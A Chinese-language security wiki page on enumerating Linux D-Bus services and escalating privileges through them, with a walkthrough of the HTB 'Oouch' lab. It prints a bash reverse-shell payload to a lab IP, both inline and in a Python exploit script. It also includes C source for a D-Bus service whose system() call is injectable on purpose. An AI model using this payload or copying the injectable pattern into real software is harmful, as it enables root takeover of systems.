# D-Bus 枚举与命令注入权限提升

{{#include ../../banners/hacktricks-training.md}}

## **GUI 枚举**

D-Bus 被用作 Ubuntu 桌面环境中的进程间通信（IPC）中介。在 Ubuntu 上，可以观察到多个 message bus 并发运行：system bus 主要由 **privileged services 用于暴露系统范围内相关的 services**，而每个已登录用户都有一个 session bus，仅暴露与该特定用户相关的 services。由于 system bus 与以更高权限（例如 root）运行的 services 相关，因此本节主要关注 system bus，因为我们的目标是提升权限。需要注意的是，D-Bus 的架构为每个 session bus 使用一个“router”，负责根据客户端为希望通信的 service 指定的地址，将客户端消息重定向到相应的 services。<sup>[[1]](#references)</sup>

D-Bus 上的 services 由其暴露的 **objects** 和 **interfaces** 定义。Objects 可以类比于标准 OOP 语言中的类实例，每个实例都由唯一的 **object path** 标识。该路径类似于文件系统路径，用于唯一标识 service 暴露的每个 object。研究时的一个关键 interface 是 **org.freedesktop.DBus.Introspectable** interface，它包含一个名为 Introspect 的方法。该方法返回一个 XML 表示，其中包含 object 支持的 methods、signals 和 properties；这里重点关注 methods，并省略 properties 和 signals。

为了与 D-Bus interface 通信，使用了两个工具：一个名为 **gdbus** 的 CLI 工具，用于在 scripts 中轻松调用 D-Bus 暴露的 methods；以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，这是一个基于 Python 的 GUI 工具，用于枚举每个 bus 上可用的 services，并显示每个 service 中包含的 objects。
```bash
sudo apt-get install d-feet
```
如果你正在检查 **session bus**，请先确认当前地址：
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

在第一张图片中，显示了注册到 D-Bus system bus 的 services，选择 System Bus button 后，特别突出显示了 **org.debin.apt**。D-Feet 会查询此 service 的 objects，并显示所选 objects 的 interfaces、methods、properties 和 signals，如第二张图片所示。每个 method 的 signature 也会详细列出。

一个值得注意的功能是显示 service 的 **process ID (pid)** 和 **command line**，这对于确认该 service 是否以 elevated privileges 运行非常有用，对研究的相关性也很重要。

**D-Feet 还允许调用 method**：用户可以输入 Python expressions 作为 parameters，D-Feet 会将其转换为 D-Bus types，然后传递给 service。

但是请注意，**某些 methods 需要 authentication**，之后才允许我们调用它们。我们将忽略这些 methods，因为我们的目标本来就是在没有 credentials 的情况下提升 privileges。

还要注意，某些 services 会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus service，以判断用户是否应被允许执行某些 actions。

## **Cmd line Enumeration**

### 列出 Service Objects

可以使用以下命令列出已打开的 D-Bus interfaces：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
标记为 **`(activatable)`** 的服务尤其值得关注，因为它们**尚未运行**，但 bus 请求可以按需启动它们。不要止步于 `busctl list`；将这些名称映射到它们实际会执行的二进制文件。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
这会快速告诉你，对于一个可激活名称，哪个 `Exec=` 路径将会启动，以及该进程将以哪个身份运行。如果二进制文件或其执行链受到的保护较弱，那么一个未激活的服务仍可能成为权限提升路径。

#### 连接

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) 当进程建立到总线的连接时，总线会为该连接分配一个特殊的总线名称，称为_唯一连接名称_。此类总线名称是不可变的——只要连接存在，就能保证它们不会发生变化；更重要的是，在总线的生命周期内它们不能被重复使用。这意味着，没有其他连接会被分配到该总线的同一个唯一连接名称，即使同一进程关闭了与总线的连接，然后重新创建一个新连接也是如此。唯一连接名称很容易识别，因为它们以冒号字符开头，而该字符在其他情况下是被禁止的。<sup>[[4]](#references)</sup>

### 服务对象信息

然后，你可以使用以下命令获取有关接口的一些信息：
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
同时将总线名称与其 `systemd` 单元和可执行文件路径关联起来：
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
这回答了 privesc 期间真正重要的操作问题：**如果方法调用成功，哪个真实的 binary 和 unit 将执行该操作？**

### 列出 Service Object 的接口

你需要拥有足够的权限。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 服务对象的 Introspect Interface

注意，在此示例中，使用 `tree` 参数选择了所发现的最新 interface（_见上一节_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
注意接口 `htb.oouch.Block` 的 `.Block` 方法（这正是我们感兴趣的方法）。其他列中的 “s” 可能意味着它期望一个字符串。

在尝试任何危险操作之前，先验证一个**面向读取**或其他低风险的方法。这样可以清晰地区分三种情况：语法错误、可访问但被拒绝，或可访问且允许执行。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### 将 D-Bus Methods 与 Policies 和 Actions 关联

Introspection 会告诉你**可以调用什么**，但不会告诉你某次调用**为何被允许或拒绝**。对于实际的 privesc triage，通常需要同时检查**三个层级**：

1. **Activation metadata**（`.service` 文件或 `SystemdService=`），了解实际会运行哪个 binary 和 unit。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`），了解谁可以执行 `own`、`send_destination` 或 `receive_sender`。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`），了解默认 authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）。

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
不要假设 D-Bus method 与 Polkit action 之间存在 1:1 的映射。同一个 method 可能会根据被修改的 object 或运行时上下文选择不同的 action。因此，实际操作流程是：

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose`，并 grep 相关的 `.policy` 文件
3. 使用 `busctl call`、`gdbus call` 或 `dbusmap --enable-probes --null-agent` 进行低风险实时探测

Proxy 或兼容性服务值得特别关注。一个以 **root** 身份运行的 **proxy**，如果通过自身预先建立的连接将请求转发给另一个 D-Bus 服务，可能会意外地使 backend 将每个请求都视为来自 UID 0，除非重新验证原始调用者身份。<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

拥有足够的权限后（仅有 `send_destination` 和 `receive_sender` 权限是不够的），你可以 **monitor D-Bus communication**。

要 **monitor** 一次 **communication**，你需要成为 **root**。如果你已经是 root 但仍然遇到问题，请检查 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> 如果你知道如何配置 D-Bus config file 以**允许非 root 用户 sniff** communication，请**联系我**！

监控的不同方式：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
在以下示例中，接口 `htb.oouch.Block` 被监控，并且**消息 "**_**lalalalal**_**" 通过 miscommunication 发送**：
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
你可以使用 `capture` 代替 `monitor`，将结果保存为 Wireshark 可以打开的 **pcapng** 文件：
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### 过滤所有噪声 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

如果 bus 上的信息太多，可以像这样传递 match rule：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
可以指定多条规则。如果消息匹配_任意一条_规则，该消息就会被打印出来。如下所示：
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
有关 match rule 语法的更多信息，请参阅 [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)。<sup>[[7]](#references)</sup>

### 更多

`busctl` 还有更多选项，[**在此查找全部选项**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **Vulnerable Scenario**

作为来自 HTB 主机 "oouch" 的用户 **qtc**，你可以找到一个位于 _/etc/dbus-1/system.d/htb.oouch.Block.conf_ 的**意外 D-Bus 配置文件**：
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
从之前的配置中可以看出，**你需要是用户 `root` 或 `www-data`，才能通过此 D-BUS 通信发送和接收信息**。

作为 Docker container 内的用户 **qtc**，在文件 _/code/oouch/routes.py_ 中可以找到一些与 D-BUS 相关的代码。以下是相关代码：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
如你所见，它正在**连接到一个 D-Bus interface**，并将“client_ip”发送给**“Block” function**。

在 D-Bus connection 的另一端，运行着某个经过 C 编译的 binary。这段代码正在 D-Bus connection 中**监听 IP address，并通过 `system` function 调用 iptables**，以阻止给定的 IP address。\
**对 `system` 的调用是故意存在 command injection 漏洞的**，因此类似下面这样的 payload 将创建一个 reverse shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 利用它

在本页面末尾，你可以找到 **D-Bus application 的完整 C code**。在其中第 91-97 行之间，你可以看到 **`D-Bus object path`** 和 **`interface name`** 是**如何注册的**。发送信息到 D-Bus connection 时将需要这些信息：
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
此外，在第 57 行可以看到，此 D-Bus 通信中**唯一注册的方法**名为 `Block`（_**因此，在以下部分中，payloads 将被发送到 service object `htb.oouch.Block`、interface `/htb/oouch/Block` 以及方法名 `Block`**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下 Python 代码将通过 `block_iface.Block(runme)` 将 payload 发送到 D-Bus 连接的 `Block` method（_注意，该代码提取自前一段代码_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 和 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` 是用于向“Message Bus”发送消息的工具
- Message Bus - 一种供系统使用的软件，用于实现应用程序之间的轻松通信。它与 Message Queue 相关（消息按顺序排列），但在 Message Bus 中，消息以订阅模型发送，速度也非常快。
- “-system” 标签用于表示这是系统消息，而不是会话消息（默认情况下）。
- “--print-reply” 标签用于适当地打印我们的消息，并以人类可读的格式接收任何回复。
- “--dest=Dbus-Interface-Block” Dbus 接口的地址。
- “--string:” - 我们要发送到接口的消息类型。发送消息有多种格式，例如 double、bytes、booleans、int、objpath。其中，当我们想要向 Dbus 接口发送文件路径时，“object path” 非常有用。在这种情况下，我们可以使用特殊文件（FIFO），以文件名的形式向接口传递命令。“string:;” - 用于再次调用 object path，在其中放置 FIFO reverse shell 文件/命令。

_请注意，在 `htb.oouch.Block.Block` 中，第一部分（`htb.oouch.Block`）引用 service object，最后一部分（`.Block`）引用 method name。_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

手动使用 `busctl`/`gdbus` 枚举大型 D-Bus attack surface 很快就会变得令人痛苦。近几年发布的两个小型 FOSS 工具，可以在 red-team 或 CTF engagement 中加快这一过程：

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* 使用 C 编写；单个静态 binary（<50 kB），会遍历每个 object path，获取 `Introspect` XML，并将其映射到所属的 PID/UID。<sup>[[5]](#references)</sup>
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 该工具会使用 `!` 标记未受保护的 well-known names，从而立即显示你可以 *own*（接管）的 services，或可从 unprivileged shell 访问的方法调用。

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* 仅使用 Python 编写的 script，用于查找 systemd units 中的 *writable* paths，以及权限过于宽松的 D-Bus policy files（例如 `send_destination="*"`）。<sup>[[6]](#references)</sup>
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module 会搜索以下目录，并突出显示任何可被 normal user spoof 或 hijack 的 service：
* `/etc/dbus-1/system.d/` 和 `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/`（vendor overrides）

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

关注近期公开的 CVE，有助于发现 custom code 中类似的不安全模式。以下是两个很好的近期示例：<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | 以 root 身份运行的 service 暴露了一个 unprivileged users 可以重新配置的 D-Bus interface，其中包括加载 attacker-controlled macro behavior。 | 如果 daemon 在 system bus 上暴露 **device/profile/config management**，应将 writable configuration 和 macro features 视为 code-execution primitives，而不只是“settings”。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | 一个以 root 身份运行的 compatibility proxy 将 requests 转发给 backend services 时，没有保留原始 caller 的 security context，因此 backend 将该 proxy 信任为 UID 0。 | 将 **proxy / bridge / compatibility** D-Bus services 视为单独的 bug class：如果它们 relay privileged calls，应验证 caller UID/Polkit context 如何传递到 backend。 |

需要注意的 patterns：
1. Service 在 system bus 上以 **root** 身份运行。
2. 要么 **没有 authorization check**，要么 check 针对的是 **错误的 subject**。
3. 可访问的方法最终会改变 system state：package install、user/group changes、bootloader config、device profile updates、file writes 或 direct command execution。

使用 `dbusmap --enable-probes` 或手动执行 `busctl call`，确认某个 method 是否可访问；然后检查 service 的 policy XML 和 Polkit actions，以了解实际授权的是 **哪个 subject**。

---

## Hardening & Detection Quick-Wins

* 搜索 world-writable 或 *send/receive*-open policies：
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 对 dangerous methods 要求 Polkit——即使是 *root* proxies，也应将 *caller* PID 传递给 `polkit_authority_check_authorization_sync()`，而不是传递自身的 PID。
* 在 long-running helpers 中 drop privileges（连接 bus 后，使用 `sd_pid_get_owner_uid()` 切换 namespaces）。
* 如果无法移除某个 service，至少将其 *scope* 限制到专用 Unix group，并在其 XML policy 中限制访问。
* Blue-team：使用 `busctl capture > /var/log/dbus_$(date +%F).pcapng` 捕获 system bus，然后将其导入 Wireshark 进行 anomaly detection。

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)

{{#include ../../banners/hacktricks-training.md}}
